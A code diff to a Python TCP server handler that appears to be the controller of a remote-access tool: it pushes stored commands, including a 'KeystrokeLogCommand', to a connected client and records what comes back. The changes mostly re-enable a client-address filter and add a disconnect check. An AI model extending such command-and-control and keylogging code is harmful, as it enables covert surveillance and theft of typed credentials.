@@ -64,33 +64,36 @@ class SingleThreadedTCPHandler(BaseRequestHandler):
 
         # Only process if client address is that we
         # desire.
-        # if self.client_address[0] == self.server.client_addr:
+        if self.client_address[0] == self.server.client_addr:
             # Increment request counter
             # for timeout threshold.
-        self.server.inc_req()
+            self.server.inc_req()
 
-            # Set listening status of host.
-        IfaWrapper.edit_host(self.server.client_addr, port, 'listening', False)
+                # Set listening status of host.
+            IfaWrapper.edit_host(self.server.client_addr, port, 'listening', False)
 
-        # Set connected status of host.
-        IfaWrapper.edit_host(self.server.client_addr, port, 'connected', True)
+            # Set connected status of host.
+            IfaWrapper.edit_host(self.server.client_addr, port, 'connected', True)
 
-            # Extract message from 'socket' object.
-        with Socket(self.request) as connection:
+                # Extract message from 'socket' object.
+            with Socket(self.request) as connection:
 
-                # Send command over channel with client.
-            if command:=IfaWrapper.get_host_attribute(self.server.client_addr, port, 'command'):
-                connection.send(command)
+                    # Send command over channel with client.
+                if command:=IfaWrapper.get_host_attribute(self.server.client_addr, port, 'command'):
+                    connection.send(command)
 
-                if IfaWrapper.get_host_attribute(self.server.client_addr, port, 'command_name') == 'KeystrokeLogCommand':
-                    sleep(30)
+                    if IfaWrapper.get_host_attribute(
+                        self.server.client_addr, port, 'command_name'
+                    ) == 'KeystrokeLogCommand':
+                        sleep(30)
 
-                IfaWrapper.edit_host(self.server.client_addr, port, 'command_out', connection.recv())
-                print(IfaWrapper.get_host_attribute(self.server.client_addr, port, 'command_out'))
+                    IfaWrapper.edit_host(
+                        self.server.client_addr, port, 'command_out', connection.recv()
+                    )
 
-        # Set statuses of host.
-        # IfaWrapper.edit_host(self.server.client_addr, port, 'connected', False)
-        IfaWrapper.edit_host(self.server.client_addr, port, 'command', None)
+            # Set statuses of host.
+            # IfaWrapper.edit_host(self.server.client_addr, port, 'connected', False)
+            IfaWrapper.edit_host(self.server.client_addr, port, 'command', None)
 
 class SingleThreadedTCPServer(TCPServer):
     """Provides the functionality for listening
@@ -266,7 +269,10 @@ class TCPServerWrapper(BaseWrapper): # pylint: disable=too-few-public-methods
             # Processing one request at a time
             # within a controlled loop.
             # Timeout: 30s.
-            while self._get_handle('SingleThreadedTCPServer').timeout_check():
+            while (
+                self._get_handle('SingleThreadedTCPServer').timeout_check() and
+                not IfaWrapper.get_host_attribute(self._client, self._port, 'disconnected')
+            ):
 
                 # Set listening status to True.
                 # network_conf.conf['selected_host'].listening = True
